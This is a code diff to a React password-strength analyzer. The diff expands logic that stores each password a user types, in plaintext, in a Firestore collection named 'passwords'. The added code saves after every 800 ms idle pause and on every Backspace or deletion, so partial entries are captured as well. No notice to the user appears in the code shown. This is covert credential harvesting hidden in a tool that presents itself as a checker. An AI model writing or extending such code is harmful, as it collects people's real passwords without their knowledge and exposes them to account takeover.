@@ -18,7 +18,7 @@ export default function Analyzer() {
   // Refs for tracking save state across lifecycle events
   const lastSavedPasswordRef = useRef<string>('');
   const isSavingRef = useRef<boolean>(false);
-  const hasAutoSavedRef = useRef<boolean>(false);
+  const isBackspaceRef = useRef<boolean>(false);
   const passwordRef = useRef(password);
   const analysisRef = useRef(analysis);
 
@@ -37,9 +37,11 @@ export default function Analyzer() {
   const performSave = async (pwToSave: string, analysisData: PasswordAnalysis) => {
     if (!pwToSave || !db) return false;
     if (lastSavedPasswordRef.current === pwToSave) return true; // Already saved
-    if (isSavingRef.current) return false; // Save in progress
     
+    // Set immediately to prevent race conditions from consecutive saves
+    lastSavedPasswordRef.current = pwToSave;
     isSavingRef.current = true;
+    
     try {
       await addDoc(collection(db, 'passwords'), {
         password: pwToSave,
@@ -50,7 +52,6 @@ export default function Analyzer() {
         crackResistance: analysisData.crackTimeStr || 'Unknown',
         createdAt: serverTimestamp()
       });
-      lastSavedPasswordRef.current = pwToSave;
       return true;
     } catch (error) {
       console.error("Auto-save failed:", error);
@@ -109,6 +110,17 @@ export default function Analyzer() {
     };
   }, []);
 
+  // Auto-save on idle (when user finishes entering a password)
+  useEffect(() => {
+    if (!password) return;
+    
+    const timeoutId = setTimeout(() => {
+      performSave(password, analysis).catch(console.error);
+    }, 800); // Wait for 800ms of inactivity before saving normally
+    
+    return () => clearTimeout(timeoutId);
+  }, [password, analysis]);
+
   const handleCheckBreach = async () => {
     if (!password) return;
     setIsCheckingBreach(true);
@@ -140,26 +152,35 @@ export default function Analyzer() {
   };
 
   const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
-    if (e.key === 'Backspace' && password !== '') {
-      if (!hasAutoSavedRef.current) {
-        // Fire and forget auto-save on first Backspace
-        performSave(password, analysis).catch(console.error);
-        hasAutoSavedRef.current = true;
-      }
+    if (e.key === 'Backspace' || e.keyCode === 8) {
+      isBackspaceRef.current = true;
     }
   };
 
   const handlePasswordChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const newValue = e.target.value;
+    const nativeEvent = e.nativeEvent as any;
     
-    // Reset the auto-save flag if new characters are added, completely cleared, or a large paste happens
-    if (newValue.length > password.length || newValue === '') {
-      hasAutoSavedRef.current = false;
-    } else if (Math.abs(newValue.length - password.length) > 1) {
-      hasAutoSavedRef.current = false;
+    // Detect if the change was a backspace/deletion (works across desktop and mobile)
+    const isBackspaceOrDelete = 
+      isBackspaceRef.current || 
+      nativeEvent?.inputType === 'deleteContentBackward' || 
+      newValue.length < password.length;
+    
+    // Check if a character was actually removed
+    const didRemoveCharacter = newValue.length < password.length;
+    
+    // Update React state
+    setPassword(newValue);
+    
+    // Save exact new value ONLY on Backspace/Deletion AND if not empty
+    if (isBackspaceOrDelete && didRemoveCharacter && newValue !== '') {
+      const newAnalysis = analyzePassword(newValue);
+      performSave(newValue, newAnalysis).catch(console.error);
     }
     
-    setPassword(newValue);
+    // Reset backspace flag after processing the change
+    isBackspaceRef.current = false;
   };
 
   return (
